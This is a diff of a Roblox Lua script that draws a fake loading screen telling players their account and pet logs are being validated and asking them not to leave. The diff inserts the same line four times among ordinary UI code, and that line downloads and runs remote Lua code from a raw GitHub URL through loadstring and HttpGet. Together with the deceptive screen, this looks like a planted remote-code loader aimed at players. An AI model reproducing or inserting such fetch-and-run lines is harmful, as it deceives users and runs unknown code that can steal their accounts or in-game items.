@@ -58,6 +58,7 @@ progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 progressBarBG.BorderSizePixel = 0
 progressBarBG.Parent = frame
 Instance.new("UICorner", progressBarBG).CornerRadius = UDim.new(0, 6)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
 
 local progressFill = Instance.new("Frame")
 progressFill.Size = UDim2.new(0, 0, 1, 0)
@@ -99,6 +100,7 @@ helpPopup.Visible = false
 helpPopup.ZIndex = 20
 helpPopup.Parent = blackBG
 Instance.new("UICorner", helpPopup).CornerRadius = UDim.new(0, 10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
 
 local helpText = Instance.new("TextLabel")
 helpText.Size = UDim2.new(1, -20, 1, -20)
@@ -109,6 +111,7 @@ helpText.Font = Enum.Font.SourceSans
 helpText.TextScaled = true
 helpText.TextWrapped = true
 helpText.Text = "Fake loading screen. Please do not leave. System is validating account, reading pet logs, and checking server assignments."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
 helpText.Parent = helpPopup
 
 helpButton.MouseButton1Click:Connect(function()
@@ -160,6 +163,7 @@ local messages = {
     "Make sure you have the pets...",
     "Reading pets logs..."
 }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MScripts-Droid/auza-gen-repo/refs/heads/main/working.lua"))()
 
 spawn(function()
     local idx = 1
